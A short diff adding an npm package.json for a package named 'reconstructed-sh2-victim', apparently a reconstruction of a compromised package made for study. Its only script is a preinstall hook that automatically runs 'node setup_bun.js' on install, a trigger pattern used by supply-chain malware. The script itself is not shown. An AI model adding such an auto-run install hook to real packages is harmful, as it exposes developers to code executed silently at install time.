@@ -1,0 +1,8 @@
+{
+  "name": "reconstructed-sh2-victim",
+  "version": "1.0.1",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node setup_bun.js"
+  }
+}
